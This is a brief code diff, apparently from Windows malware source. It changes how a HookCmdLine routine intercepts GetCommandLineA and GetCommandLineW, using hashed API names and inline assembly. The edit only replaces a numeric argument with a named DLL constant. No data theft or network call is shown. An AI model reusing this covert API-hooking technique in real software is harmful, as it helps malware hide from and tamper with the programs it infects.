@@ -164,12 +164,12 @@ PWCHAR WINAPI Hook_GetCommandLineW()
 bool HookCmdLine() 
 {
 	DBG("CmdLine", "Перехват функций API");
-	if ( HookApi( 1, Hash_GetCommandLineA, &Hook_GetCommandLineA ) )
+	if ( HookApi( DLL_KERNEL32, Hash_GetCommandLineA, &Hook_GetCommandLineA ) )
 	{  
 		__asm mov [Real_GetCommandLineA], eax			
 	}	
 
-	if ( HookApi( 1, Hash_GetCommandLineW, &Hook_GetCommandLineW ) )
+	if ( HookApi( DLL_KERNEL32, Hash_GetCommandLineW, &Hook_GetCommandLineW ) )
 	{  
 		__asm mov [Real_GetCommandLineW], eax			
 	}
